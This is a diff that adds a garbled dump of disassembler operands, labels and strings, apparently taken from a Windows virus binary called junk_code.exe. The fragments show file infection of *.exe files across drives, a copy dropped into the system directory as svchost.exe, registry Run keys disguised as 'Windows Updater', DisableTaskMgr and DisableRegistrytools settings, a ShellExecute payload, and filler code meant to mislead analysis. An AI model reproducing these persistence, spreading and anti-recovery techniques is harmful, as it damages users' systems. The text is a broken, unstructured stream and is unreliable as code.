@@ -1,0 +1,2144 @@
+
+_
+junk_code.exe@ac1846c90431be01db809a1c6c4fb3b0fd4d39525e879f0b8c6d88bbf144846bx86-32 ÚýéÔEBPEAXESP0x18($word ptr [IMAGE_DOS_HEADER_00400000]
+0x5a4d*&dword ptr [___mingw_initltsdrot_force]0x1)%dword ptr [___mingw_initltsdyn_force])%dword ptr [___mingw_initltssuo_force]LAB_00401059EDX2.dword ptr [IMAGE_DOS_HEADER_00400000.e_lfanew]dword ptr [EDX + 0x400000]
+0x4550ECX[EDX + 0x400000]LAB_004010b0[_managedapp][___mingw_app_type]LAB_004010a0dword ptr [ESP]0x2___set_app_type___p__fmodedword ptr [__fmode]dword ptr [EAX]___p__commodedword ptr [__commode]	__setargv-)dword ptr [__MINGW_INSTALL_DEBUG_MATHERR]LAB_004010e0LAB_00401073word ptr [ECX + 0x18]DX	0x10bLAB_004010f0	0x20bdword ptr [ECX + 0x84]0xedword ptr [ECX + 0xf8]AL	__matherr___mingw_setusermatherrdword ptr [ECX + 0x74]dword ptr [ECX + 0xe8]0x28[__newmode]dword ptr [ESP + 0x10]
+_startinfo[_startinfo][__dowildcard]dword ptr [ESP + 0x8]	_envpdword ptr [ESP + 0xc]dword ptr [ESP + 0x4]	_argv	_argc___getmainargs[ESP + 0x4]
+0xfffffff0 dword ptr [ECX + local_res0]EDIESIEBXdword ptr [__imp__Sleep@4]	FS:[0x18]dword ptr [EAX + 0x4]LAB_00401194LAB_00401310	0x3e80x4&"dword ptr [___native_startup_lock]LAB_00401180[___native_startup_state]LAB_00401323LAB_00401390dword ptr [_has_cctor]LAB_0040133dLAB_00401363[___dyn_tls_init_callback]LAB_00401204dword ptr [ESP + local_38]0x0dword ptr [ESP + local_3c]0xc__pei386_runtime_relocator__gnu_exception_handler@440dword ptr [__imp__SetUnhandledExceptionFilter@4][___mingw_oldexcpt_handler]LAB_00401000#__set_invalid_parameter_handler_fpresetdword ptr [_argc][ESI*0x4 + 0x4]_mallocdword ptr [_argv]LAB_004013b8[EDI + -0x4]dword ptr [EBP + local_28][EBX + EDX*0x1]dword ptr [EBP + local_2c]dword ptr [EBP + local_24]	[ESI]dword ptr [EBX]_strlen[EAX + 0x1]dword ptr [ESI + -0x4]dword ptr [EBX + -0x4]_memcpyLAB_00401268dword ptr [EDX]___main[_envp] dword ptr [__imp____initenv][_argv][_argc].text.startupdword ptr [_managedapp]
+[_mainret]LAB_004013bfLAB_00401370[EBP + -0x10][ECX + -0x4]LAB_004011b20x1f__amsg_exitLAB_004011d7___xc_zDAT_0040b000
+__initterm'#dword ptr [___native_startup_state]LAB_004011df__cexit___xi_z___crt_xc_end__LAB_004011c9LAB_004012a6	_exit!dword ptr [___mingw_app_type]___tmainCRTStartupdword ptr [EBP + param_1]__onexit0x1c!s_libgcc_s_dw2-1.dll_00407000)%dword ptr [__imp__GetModuleHandleA@4]LAB_004014a0%!dword ptr [__imp__LoadLibraryA@4]'#dword ptr [__imp__GetProcAddress@8][_hmod_libgcc]$ s___register_frame_info_004070130x8&"s___deregister_frame_info_00407029[DAT_00406000]LAB_00401486_obj___EH_FRAME_BEGIN_____gcc_deregister_frame_atexit[EBP + -0xc]___deregister_frame_info___register_frame_infoLAB_0040146cLAB_004014c8LAB_004014dd$ dword ptr [__imp__FreeLibrary@4]	0x474dword ptr [ESP + local_478]	operator|[EBP + 0xfffffeec]basic_ifstreamdword ptr [ESP + local_474]	seekg[EBP + 0xfffffed8]	tellgoperator.cast.to.long_longdword ptr [EBP + local_14]dword ptr [ESP + local_47c]	[_Buffer]dword ptr [_Buffer]read	closedword ptr [EBP + local_130]0x7LAB_00401806[EBP + 0xfffffc00][__imp__GetSystemInfo@4]dword ptr [EBP + local_400]dword ptr [EBP + local_134]dword ptr [EBP + local_3e8]dword ptr [EBP + local_138][EBP + 0xfffffebc][__imp__GetLocalTime@4]word ptr [EBP + local_148]word ptr [EBP + local_14a]AXword ptr [EBP + local_146]word ptr [EBP + local_14c]word ptr [EBP + local_142]word ptr [EBP + local_14e]dword ptr [EBP + local_154]	0x100[EBP + 0xfffffeb0][EBP + 0xfffffc40][__imp__GetUserNameA@8]dword ptr [EBP + local_158]dword ptr [EBP + local_15c][EBP + 0xfffffea8][EBP + 0xfffffd40][__imp__GetComputerNameA@8]dword ptr [EBP + local_160]dword ptr [EBP + local_164]0x10LAB_00401723LAB_00401728LAB_0040173d
+0xdeadbeefdword ptr [EBP + local_168]LAB_0040178e0x5LAB_00401749dword ptr [EBP + local_16c]LAB_004017ddCL)%byte ptr [EBP + EAX*0x1 + 0xfffffbc0]DLLAB_004017aa0x40[EBP + 0xfffffbc0]_RtlSecureZeroMemory@8dword ptr [EBP + local_10]LAB_00401b19[__imp__GetTickCount@0]dword ptr [EBP + local_170]
+0xa5a5a5a5LAB_0040183dLAB_00401842LAB_00401abddword ptr [EBP + local_178]LAB_004018a50x30xd0x7f
+0x51eb851f0x64)%byte ptr [EBP + EAX*0x1 + 0xfffffc40]BL0x63LAB_00401856byte ptr [EBP + local_361]dword ptr [EBP + local_18]dword ptr [EBP + local_174]0x80dword ptr [EBP + local_1c]LAB_00401a84byte ptr [EAX]dword ptr [EBP + local_17c]dword ptr [EBP + local_188]LAB_004019c9dword ptr [EBP + local_18c]LAB_004019aa0x1a0x3f
+0x61c88647LAB_0040194b0x9LAB_0040193f
+.rdata[__imp__sprintf_s]dword ptr [EBP + local_180]byte ptr [EBP + local_181]dword ptr [EBP + local_190]LAB_00401a69)%byte ptr [EBP + EAX*0x1 + 0xfffffd40]LAB_00401a2e	_free0x2aLAB_00401b150x42byte ptr [_Status]0x59byte ptr [DAT_004095a1]0x45byte ptr [DAT_004095a2]0x53byte ptr [DAT_004095a3]LAB_00401b25LAB_00401812DAT_0040704e_Status_strcmpLAB_00401bd6basic_ofstreamdword ptr [EBP + param_2]
+operator<<
+0x40008164dword ptr [ESP + local_46c]	write~basic_ofstream [__imp__GetCurrentProcess@0][__imp__GetPriorityClass@4]-0x1LAB_00401fd1dword ptr [EBP + local_1a4]LAB_00401c42-0x61c88647*&dword ptr [EBP + EAX*0x4 + 0xfffffd40]LAB_00401c04dword ptr [EBP + local_194]
+0x811c9dc5dword ptr [EBP + local_1a8]LAB_00401ca4	0x1000193LAB_00401c68dword ptr [EBP + local_1ac]LAB_00401d790xfdword ptr [EBP + local_1b0]dword ptr [EBP + local_1b4]LAB_00401d39[EAX*0x8 + 0x0]LAB_00401cedLAB_00401cc3dword ptr [EBP + local_1b8]LAB_00401e290x1e0x5aLAB_00401e1aLAB_00401d9cdword ptr [EBP + local_19c]dword ptr [EBP + local_198]dword ptr [EBP + local_1bc]LAB_00401eed0x13LAB_00401e60dword ptr [EBP + local_1a0]dword ptr [EBP + local_1c0]LAB_00401f5a
+0x12345678LAB_00401f17dword ptr [EBP + local_1c4]LAB_00401fa8)%byte ptr [EBP + EAX*0x1 + 0xfffffba0]LAB_00401f760x20[EBP + 0xfffffba0]~basic_ifstreamLAB_00402017dword ptr [EBP + local_8]	0x810dword ptr [EBP + local_42a]dword ptr [EBP + local_426]dword ptr [EBP + local_422]dword ptr [EBP + local_41e]dword ptr [EBP + local_41a]dword ptr [EBP + local_416]dword ptr [EBP + local_412]dword ptr [EBP + local_40e]dword ptr [EBP + local_40a]dword ptr [EBP + local_406]word ptr [EBP + local_402]dword ptr [EBP + local_43a]dword ptr [EBP + local_436]dword ptr [EBP + local_432]dword ptr [EBP + local_42e][EBP + 0xfffffb2a]0xa0$ dword ptr [EAX + ECX*0x1 + -0x4][EAX + 0x4]
+0xfffffffc
+ES:EDIdword ptr [EBP + local_4ea]dword ptr [EBP + local_4e6]dword ptr [EBP + local_4e2]dword ptr [EBP + local_4de]dword ptr [EBP + local_4fa]dword ptr [EBP + local_4f6]dword ptr [EBP + local_4f2]dword ptr [EBP + local_4ee]dword ptr [EBP + local_30]
+0xffffffffdword ptr [EBP + local_34]dword ptr [EBP + local_38]dword ptr [EBP + local_3c]dword ptr [EBP + local_500]LAB_00402509[EBP + 0xfffff99c]dword ptr [EBP + local_6e8]dword ptr [EBP + local_6e4]dword ptr [EBP + local_6e0]dword ptr [EBP + local_6dc]dword ptr [EBP + local_6d8]dword ptr [EBP + local_6d4]dword ptr [EBP + local_6d0]dword ptr [EBP + local_6cc]dword ptr [EBP + local_6c8]dword ptr [EBP + local_6c4]dword ptr [EBP + local_6c0]dword ptr [EBP + local_6bc]dword ptr [EBP + local_6b8]dword ptr [EBP + local_6b4]dword ptr [EBP + local_6b0]dword ptr [EBP + local_6ac]dword ptr [EBP + local_514][EBP + 0xfffff8dc][EBP + 0xfffffaf4]dword ptr [EBP + local_714]dword ptr [EBP + local_518]dword ptr [EBP + local_724]dword ptr [EBP + local_51c]dword ptr [EBP + local_520]dword ptr [EBP + local_7f8]dword ptr [EBP + local_7f4]dword ptr [EBP + local_7f0]dword ptr [EBP + local_7ec]dword ptr [EBP + local_7e8]dword ptr [EBP + local_7e4]dword ptr [EBP + local_7e0]dword ptr [EBP + local_7dc]LAB_0040233b0x37[EAX + 0x13][EBP + 0xfffff80c]LAB_004022f3dword ptr [ESP + local_80c]dword ptr [ESP + local_810]dword ptr [ESP + local_814]dword ptr [ESP + local_818]word ptr [EBP + local_504]word ptr [EBP + local_506]word ptr [EBP + local_508]dword ptr [ESP + 0x14]s_H:%u_M:%u_S:%u_0040706a[EBP + 0xfffff91c]dword ptr [EBP + local_524]dword ptr [EBP + local_528]dword ptr [EBP + local_52c]dword ptr [EBP + local_768]dword ptr [EBP + local_764]dword ptr [EBP + local_760]dword ptr [EBP + local_75c]dword ptr [EBP + local_758]dword ptr [EBP + local_754]dword ptr [EBP + local_750]dword ptr [EBP + local_74c]dword ptr [EBP + local_748]dword ptr [EBP + local_744]dword ptr [EBP + local_740]dword ptr [EBP + local_73c]dword ptr [EBP + local_738]dword ptr [EBP + local_734]dword ptr [EBP + local_730]dword ptr [EBP + local_72c]0x3eLAB_004024b6LAB_004024bb[EBP + 0xfffff89c][EBP + 0xfffffbda]
+0x63617263dword ptr [EAX + local_426]
+0x78652e6bword ptr [EAX + local_422]0x65
+0x1388[__imp__Sleep@4][EBP + 0xfffffe84]s_*.exe_00407079[__imp__FindFirstFileA@8]LAB_004025a4
+[_VBuffer]0x2c
+Infect[__imp__FindNextFileA@8]LAB_00402557[__imp__FindClose@4]_Drives	0x400&"[__imp__GetLogicalDriveStringsA@8]LAB_004026360xa_strcpy_strcat
+_Virus[__imp__CopyFileA@12]LAB_004025c6dword ptr [EBP + local_530]LAB_0040266bLAB_00402670LAB_004029d6dword ptr [EBP + local_40]dword ptr [EBP + local_728]dword ptr [EBP + local_720]dword ptr [EBP + local_71c]dword ptr [EBP + local_718]dword ptr [EBP + local_710]dword ptr [EBP + local_70c]dword ptr [EBP + local_708]dword ptr [EBP + local_704]dword ptr [EBP + local_700]dword ptr [EBP + local_6fc]dword ptr [EBP + local_6f8]dword ptr [EBP + local_6f4]dword ptr [EBP + local_6f0]dword ptr [EBP + local_6ec]dword ptr [EBP + local_534]s_Tick_%lu__0040707f s_DummyData_%lu_%lu_00407089dword ptr [EBP + local_538]dword ptr [EBP + local_53c]LAB_0040289ddword ptr [EBP + local_7d8]dword ptr [EBP + local_7d4]dword ptr [EBP + local_7d0]dword ptr [EBP + local_7cc]dword ptr [EBP + local_7c8]dword ptr [EBP + local_7c4]dword ptr [EBP + local_7c0]dword ptr [EBP + local_7bc]s_Iter_%d__0040709b[EBP + 0xfffff82c]LAB_0040286eLAB_00402873LAB_004027e4dword ptr [EBP + local_540]dword ptr [EBP + local_544]LAB_0040295fLAB_00402977LAB_0040297cLAB_0040292b[EBP + 0xfffffd44]DAT_004070a4LAB_00402ba1dword ptr [EBP + local_2c0]LAB_00402b6a[EBP + 0xfffffbca][EBP + 0xfffffb1a][EBP + 0xfffffb0a]
+0x2a2e2a5cbyte ptr [EAX + 0x4][EBP + 0xfffffc04]0x5c)%byte ptr [EBP + EAX*0x1 + 0xfffffbca][__imp__DeleteFileA@4]LAB_00402ac0LAB_004029feLAB_00402522dword ptr [EBP + local_798]dword ptr [EBP + local_794]dword ptr [EBP + local_790]dword ptr [EBP + local_78c]dword ptr [EBP + local_788]dword ptr [EBP + local_784]dword ptr [EBP + local_780]dword ptr [EBP + local_77c]dword ptr [EBP + local_778]dword ptr [EBP + local_774]dword ptr [EBP + local_770]dword ptr [EBP + local_76c]dword ptr [EBP + local_548]dword ptr [EBP + local_54c]dword ptr [EBP + local_20]LAB_00402c77
+0xffffff9e[EAX + 0x37][EBP + 0xfffff86c]0x2fLAB_00402c58LAB_00402cdeLAB_00402c86dword ptr [EBP + local_550]dword ptr [EBP + local_554]LAB_00402d2d)%byte ptr [EBP + EAX*0x1 + 0xfffff86c]LAB_00402d01dword ptr [EBP + local_558]dword ptr [EBP + local_55c]LAB_00402daa0x1dLAB_00402d53dword ptr [EBP + local_560]
+0x7fffffffdword ptr [EBP + local_564]dword ptr [EBP + local_7b8]dword ptr [EBP + local_7b4]dword ptr [EBP + local_7b0]dword ptr [EBP + local_7ac]dword ptr [EBP + local_7a8]dword ptr [EBP + local_7a4]dword ptr [EBP + local_7a0]dword ptr [EBP + local_79c]s_Hash_%08lX_004070a7[EBP + 0xfffff84c]dword ptr [EBP + local_568]0x30	0x314dword ptr [EBP + local_14c]dword ptr [EBP + local_150]LAB_004030ce[EBP + 0xfffffd10][EBP + 0xfffffea0]LAB_00402f6e[EBP + 0xfffffdf4]LAB_00402f25[EBP + 0xfffffe98]dword ptr [ESP + local_318][EBP + 0xfffffd74]LAB_00402feaLAB_00402fe4LAB_00402fb7[EBP + 0xfffffe94][EBP + 0xfffffdb4]LAB_00403053LAB_0040304dLAB_00403019LAB_004030a90xaaLAB_00403066	0x104[EBP + 0xfffffec0]"[__imp__GetSystemDirectoryA@8]
+0x6e65475c
+0x63697265byte ptr [EAX + 0x8][__imp__CreateDirectoryA@8]
+0x6376735c
+0x74736f68dword ptr [EAX + 0x8]
+0x6578652ebyte ptr [EAX + 0xc]dword ptr [ESP + local_314]LAB_004031b2LAB_004031b7LAB_004033d6LAB_004031fb0x55[EAX + 0x12][EBP + 0xfffffd34]LAB_004031dcLAB_00403268LAB_0040320aLAB_004032ca
+0x41c64e6d
+0x3039[EAX + EAX*0x1]LAB_00403281LAB_00403347
+0xffffffaa[EAX + 0x5]LAB_004032d9dword ptr [EBP + local_184]LAB_004033ab[EAX + 0x7]
+0x151d07eb0x61LAB_00403360dword ptr [ESP + local_30c]dword ptr [ESP + local_310]
+0x80000002[__imp__RegOpenKeyExA@20]0x14dword ptr [EBP + local_148]dword ptr [ESP + local_308]/+s_Generic_Host_Process_for_Win32_S_004070e4[__imp__RegSetValueExA@24][__imp__RegCloseKey@4]/+s_SOFTWARE\Microsoft\Windows\Curre_0040710cs_Windows_Updater_0040713e/+s_SOFTWARE\Microsoft\Windows\Curre_00407150s_Windows_Server_00407184/+s_SOFTWARE\Microsoft\Windows\Curre_00407194s_Generic_004071caLAB_004037ebs_DummyData_%08X_004071d2LAB_004036b8LAB_004036bdbyte ptr [EBP + local_251]_memsetLAB_0040375cLAB_00403704LAB_004037b2LAB_00403775/+s_SOFTWARE\Microsoft\Windows\Curre_004071e4
+0x80000001[EBP + 0xfffffeb8]s_DisableTaskMgr_0040721e#s_DisableRegistrytools_0040722d[__imp___time32]	0x674[__imp__GetModuleHandleA@4]dword ptr [ESP + local_674]dword ptr [ESP + local_678]"[__imp__GetModuleFileNameA@12]
+Secretbyte ptr [_inf]byte ptr [_DAT_140008165]byte ptr [_DAT_140008166]dword ptr [EBP + local_64]LAB_00403b34[EBP + 0xfffff9b4]dword ptr [EBP + local_64c]dword ptr [EBP + local_3c0]dword ptr [EBP + local_634]dword ptr [EBP + local_3c4]dword ptr [EBP + local_63c]dword ptr [EBP + local_3c8][EBP + 0xfffffc2c]word ptr [EBP + local_3d8]word ptr [EBP + local_3da]word ptr [EBP + local_3d6]word ptr [EBP + local_3dc]word ptr [EBP + local_3d2]word ptr [EBP + local_3de]dword ptr [EBP + local_3e4][EBP + 0xfffffc20][EBP + 0xfffff9f4]byte ptr [EBP + local_610]byte ptr [EBP + local_3e5]dword ptr [EBP + local_3ec][EBP + 0xfffffc18]dword ptr [EBP + local_3f0]LAB_00403aa2LAB_00403a71dword ptr [EBP + local_3f4][EBP + 0xfffffea4][EBP + 0xfffffe90]dword ptr [EBP + local_44]dword ptr [ESP + local_67c]dword ptr [_VBuffer]LAB_00403c81LAB_00403c7d
+[_FBuffer]LAB_00403c89LAB_00403c29LAB_00403cb4LAB_00403cb9LAB_00403e87LAB_00403d01LAB_00403ce8dword ptr [EBP + local_48]LAB_00403dd00x11dword ptr [EBP + local_4c]dword ptr [EBP + local_3fc]dword ptr [ESP + local_670] s_Len=%zu,_Tick=%lu_00407255byte ptr [EBP + local_510]byte ptr [EBP + local_3fd]LAB_00403dbfLAB_00403da3dword ptr [EBP + local_3f8]LAB_00403e49LAB_00403e3fLAB_00403e2dLAB_00403e3bLAB_00403e0bLAB_00403de3[EBP + 0xfffffd4c]s_*.exe_00407267dword ptr [EBP + local_50]LAB_00403ef8LAB_00403eab	_timedword ptr [EBP + local_54]
+_srand	_randdword ptr [EBP + local_58]	_buff	_itoadword ptr [EBP + local_5c][EBP + 0xfffffc48]
+0x6972645c
+0x73726576LAB_004041c7LAB_00403ff5*&dword ptr [EBP + EAX*0x4 + 0xfffff9f4]LAB_00403fdedword ptr [EBP + local_404]LAB_0040406aLAB_004040600x1bLAB_0040402fLAB_0040400edword ptr [EBP + local_408]LAB_00404147LAB_00404086dword ptr [EBP + local_40c]LAB_00404186LAB_00404164dword ptr [EBP + local_410]LAB_00404290LAB_0040423b[EAX + 0x3]dword ptr [EBP + local_60]dword ptr [_FBuffer][__imp__ShellExecuteA@24]PayloadLAB_004042d5+'dword ptr [__imp____gxx_personality_v0]NJdword ptr [__imp___ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc]EAdword ptr [__imp___ZNSt14basic_ofstreamIcSt11char_traitsIcEED1Ev]XTdword ptr [__imp___ZNSt14basic_ofstreamIcSt11char_traitsIcEEC1EPKcSt13_Ios_Openmode]IEdword ptr [__imp___ZNSt14basic_ofstreamIcSt11char_traitsIcEE5closeEv]EAdword ptr [__imp___ZNSt14basic_ifstreamIcSt11char_traitsIcEED1Ev]XTdword ptr [__imp___ZNSt14basic_ifstreamIcSt11char_traitsIcEEC1EPKcSt13_Ios_Openmode]IEdword ptr [__imp___ZNSt14basic_ifstreamIcSt11char_traitsIcEE5closeEv]'#dword ptr [__imp___ZNSo5writeEPKci]$ dword ptr [__imp___ZNSi5tellgEv]40dword ptr [__imp___ZNSi5seekgExSt12_Ios_Seekdir]%!dword ptr [__imp___ZNSi4readEPci]
+[_p.0]LAB_00404378$ [EAX + offset .gcc_except_table].*dword ptr [EAX + offset .gcc_except_table]dword ptr [_p.0]LAB_00404358dword ptr [___CTOR_LIST__]LAB_004043c0LAB_004043ac"dword ptr [EBX*0x4 + 0x4058f0]LAB_004043a0___do_global_dtors"dword ptr [EAX*0x4 + 0x4058f0]LAB_004043c8LAB_00404392[_initialized]LAB_004043f0dword ptr [_initialized]___do_global_ctorsLAB_00404430dword ptr [ESP + local_18] dword ptr [EBP + Stack[0xc]]dword ptr [ESP + local_14]___mingw_TLScallbackdword ptr [__CRT_MT]LAB_0040446dLAB_00404488LAB_004044c0___xd_zLAB_00404477LAB_004044a0LAB_004044980x50dword ptr [EBP + _Except][ECX + -0x1]LAB_00404521#dword ptr [EDX*0x4 + _CSWTCH.1]qword ptr [EAX + 0x18]qword ptr [EBP + local_24]qword ptr [EAX + 0x10]qword ptr [EBP + local_1c]qword ptr [EAX + 0x8]qword ptr [EBP + local_14]___acrt_iob_funcdword ptr [ESP + local_50]dword ptr [ESP + local_54]dword ptr [ESP + local_58]/+s__matherr():_%s_in_%s(%g,_%g)_(re_004072a0qword ptr [ESP + local_3c]qword ptr [ESP + local_44]qword ptr [ESP + local_4c]_fprintf[EBP + 0xc]dword ptr [ESP + local_10]_fwrite	_vfprintf
+_abort0x3cdword ptr [_maxSections]LAB_00404710[_the_secs]LAB_0040462cdword ptr [EDI + 0x8]LAB_004046adLAB_00404618!___mingw_GetSectionForAddressLAB_00404737[ESI + ESI*0x4]dword ptr [EAX + 0x10]__GetPEImageBasedword ptr [_the_secs]dword ptr [EDI + 0xc]#dword ptr [EDX + EBX*0x1 + 0xc][EBP + -0x34]dword ptr [ESP + local_44]dword ptr [ESP + local_48]&"dword ptr [__imp__VirtualQuery@12]LAB_00404717[EAX + -0x4]
+0xfffffffbLAB_004046a6[EAX + -0x40]
+0xffffffbfLAB_004046b8dword ptr [EBX + 0x8]dword ptr [EBX + 0x4]($dword ptr [__imp__VirtualProtect@16]%!dword ptr [__imp__GetLastError@0]/+s__VirtualProtect_failed_with_code_00407434___report_errorLAB_00404636#dword ptr [EAX + EBX*0x1 + 0xc]/+s__VirtualQuery_failed_for_%d_byte_00407400.*s_Address_%p_has_no_image-section_004073e00x4cdword ptr [_was_init.0]LAB_00404770___mingw_GetSectionCount[EAX + EAX*0x4][EAX*0x4 + 0x1b]___chkstk_ms[ESP + 0x23]%!__RUNTIME_PSEUDO_RELOC_LIST_END__LAB_004047631-dword ptr [__RUNTIME_PSEUDO_RELOC_LIST_END__]0xbLAB_004048d8LAB_00404985LAB_00404a2fLAB_00404864LAB_00404a1f.*byte ptr [EDI + IMAGE_DOS_HEADER_00400000]0xe0LAB_0040482f
+0xffffff00LAB_004048470xffLAB_004048b0	-0x80_mark_section_writableLAB_00404960dword ptr [ESI + 0x4]%![EDI + IMAGE_DOS_HEADER_00400000]dword ptr [ESI]%![EAX + IMAGE_DOS_HEADER_00400000]/+dword ptr [EAX + IMAGE_DOS_HEADER_00400000]dword ptr [ESI + 0x8]LAB_00404908LAB_00404810/+dword ptr [EDI + IMAGE_DOS_HEADER_00400000]LAB_00404968LAB_00404855/+s_%d_bit_pseudo_relocation_at_%p_o_004074bcLAB_00404980[DAT_00407854]DAT_0040785cdword ptr [DAT_00407858]LAB_004047cfLAB_004047dc.*word ptr [EDI + IMAGE_DOS_HEADER_00400000]BXLAB_0040491f
+0xffff0000LAB_00404942
+0xffff8000
+0xffffLAB_004049c2/+dword ptr [ESI + IMAGE_DOS_HEADER_00400000]%![ESI + IMAGE_DOS_HEADER_00400000]LAB_00404998[EBP + -0x1c][EDI + EDI*0x4][EDX + EAX*0x4]LAB_00404a0cLAB_004049e0/+s__Unknown_pseudo_relocation_bit_s_00407490/+s__Unknown_pseudo_relocation_proto_0040745c[_stUserMathErr]___setusermatherrdword ptr [EBP + 0x8]
+0xc0000093LAB_00404b7aLAB_00404b20
+0xc000001dLAB_00404b32LAB_00404b70
+0xc0000005LAB_00404b08_signalLAB_00404c00LAB_00404bdfLAB_00404b60dword ptr [EBP + -0x4]
+0xc0000094LAB_00404bb0
+0xc0000096LAB_00404beaLAB_00404ba8
+0x3fffff73LAB_00404c16LAB_00404b62LAB_00404b97___mingwthr_cs-)dword ptr [__imp__EnterCriticalSection@4]dword ptr [_key_dtor_list]LAB_00404c99$ dword ptr [__imp__TlsGetValue@4]LAB_00404c92LAB_00404c70-)dword ptr [__imp__LeaveCriticalSection@4][___mingwthr_cs_init]LAB_00404cd0_callocLAB_00404d31dword ptr [EBP + 0xc][_key_dtor_list]LAB_00404d2cLAB_00404d60LAB_00404da0LAB_00404d88LAB_00404d80LAB_00404dc0dword ptr [ECX + 0x8]LAB_00404d98LAB_00404e80LAB_00404e10LAB_00404e28LAB_00404ea0#dword ptr [___mingwthr_cs_init]LAB_00404e00$ ___mingwthr_run_key_dtors.part.0LAB_00404e90LAB_00404e59LAB_00404e48.*dword ptr [__imp__DeleteCriticalSection@4]LAB_00404e312.dword ptr [__imp__InitializeCriticalSection@4]LAB_00404df6 dword ptr [EBP + pImageBase]word ptr [EAX]LAB_00404edadword ptr [EAX + 0x3c]LAB_00404ee0word ptr [EAX + 0x18]dword ptr [EBP + rva]dword ptr [EDX + 0x3c]word ptr [EDX + 0x14]word ptr [EDX + 0x6][EDX + EAX*0x1 + 0x18]SILAB_00404f30dword ptr [EAX + 0xc]LAB_00404f26LAB_00404f32LAB_00404f18LAB_00404fcdword ptr [EDX + 0x400018]word ptr [EDX + 0x400014]word ptr [EAX + 0x6][EAX + EDX*0x1 + 0x18]DILAB_00404fe0LAB_00404fb2_strncmpLAB_00404fa8LAB_00405015dword ptr [ECX + 0x400000][ECX + 0x400000]LAB_00405020word ptr [ECX + 0x400018]word ptr [ECX + 0x400014]word ptr [ECX + 0x400006]IMAGE_DOS_HEADER_00400000LAB_00405070LAB_00405066LAB_00405072LAB_00405058LAB_0040509fLAB_004050a0word ptr [EDX + 0x400006]LAB_004050ecdword ptr [EBX + 0x400000][EBX + 0x400000]LAB_004050f8word ptr [EBX + 0x400018]word ptr [EBX + 0x400014]word ptr [EBX + 0x400006]LAB_00405137byte ptr [EAX + 0x27]LAB_0040512dLAB_00405120LAB_0040515fLAB_00405160LAB_004051a4($[IMAGE_DOS_HEADER_00400000.e_lfanew]dword ptr [EAX + 0x400000][EAX + 0x400000]LAB_004051b0word ptr [EAX + 0x400018]word ptr [EAX + 0x400014][ECX + EAX*0x1 + 0x18]dword ptr [EBP + pTarget]word ptr [ECX + 0x6]LAB_004051faLAB_004051eeLAB_00405200LAB_004051e0dword ptr [EAX + 0x24]LAB_0040523dLAB_0040524873word ptr [EAX + IMAGE_DOS_HEADER_00400000.e_lfarlc]1-dword ptr [EAX + IMAGE_NT_HEADERS32_00400080]word ptr [ESI + 0x14]word ptr [ESI + 0x6][ESI + EDX*0x1 + 0x18]dword ptr [EDX + 0xc]LAB_0040527edword ptr [EDX + 0x8]LAB_00405298LAB_00405270LAB_004052a6;7dword ptr [EAX + offset IMAGE_DOS_HEADER_00400000.e_cp]LAB_004052b4A=dword ptr [EAX + offset IMAGE_DOS_HEADER_00400000.e_maxalloc]LAB_00405288LAB_004052a0,(dword ptr [__imp____register_frame_info].*dword ptr [__imp____deregister_frame_info]%!dword ptr [__imp___Unwind_Resume]
+0x1000[ESP + 0xc]LAB_0040530adword ptr [ECX]LAB_004052f5[EBP + 0x14]dword ptr [EBP + _Format]"dword ptr [EBP + _SizeInBytes]dword ptr [EBP + _DstBuf]_vsprintf_s
+[_handler]dword ptr [EBP + _Handler]dword ptr [_handler]dword ptr [__imp___iob]$ dword ptr [__imp____getmainargs]"dword ptr [__imp____p__acmdln]#dword ptr [__imp____p__commode]!dword ptr [__imp____p__fmode]%!dword ptr [__imp____set_app_type]'#dword ptr [__imp____setusermatherr]!dword ptr [__imp___amsg_exit]dword ptr [__imp___cexit] dword ptr [__imp___initterm]!dword ptr [__imp___ismbblead]dword ptr [__imp___onexit]dword ptr [__imp__abort]dword ptr [__imp__calloc]dword ptr [__imp__exit]dword ptr [__imp__fprintf]dword ptr [__imp__free]dword ptr [__imp__fwrite]dword ptr [__imp__malloc]dword ptr [__imp__memcpy]dword ptr [__imp__memset]dword ptr [__imp__rand]dword ptr [__imp__signal]dword ptr [__imp__srand]dword ptr [__imp__strcat]dword ptr [__imp__strcmp]dword ptr [__imp__strcpy]dword ptr [__imp__strlen]dword ptr [__imp__strncmp]dword ptr [__imp__vfprintf]dword ptr [__imp__itoa]___ms_vsnprintf[__imp__vsprintf_s]dword ptr [EBP + 0x10]dword ptr [EBP + 0x14]
+__stubLAB_004054d0dword ptr [EBP + -0x1c])%dword ptr [__imp__GetModuleHandleW@4]s_vsprintf_s_00407526__int_vsprintf_sLAB_004054b1dword ptr [EBP + _ArgList]LAB_00405550LAB_00405531LAB_004055b4byte ptr [EDX]LAB_004055a8LAB_004055f0__vscprintf__vsnprintfLAB_00405620#byte ptr [EDX + EBX*0x1 + -0x1]LAB_004055d9LAB_004056de[EAX + EAX*0x1 + 0x1]LAB_0040569fLAB_004056afLAB_004056c8_reallocLAB_004056a7
+0x7ffffffeLAB_00405670__set_errnoLAB_004056d60x16LAB_004056bbLAB_00405740s__vscprintf_0040754a[__imp___vscprintf][EBP + -0x8]_emu_vscprintfLAB_0040572a!dword ptr [__imp___vscprintf]__errnodword ptr [EBP + _Value]LAB_004057a0dword ptr [__imp___errno]!dword ptr [__imp___vsnprintf]dword ptr [__imp__realloc]0x68___p__acmdlnLAB_00405854LAB_004058d3LAB_0040587fLAB_00405867__ismbbleadLAB_00405851byte ptr [EBX + 0x1]byte ptr [EBX]LAB_004058300x22LAB_0040583eLAB_00405870[EBP + -0x5c]($dword ptr [__imp__GetStartupInfoA@4]byte ptr [EBP + local_38]LAB_004058a8word ptr [EBP + local_34]_WinMain@16___gcc_register_frame 	
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œžŸ ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œžŸ 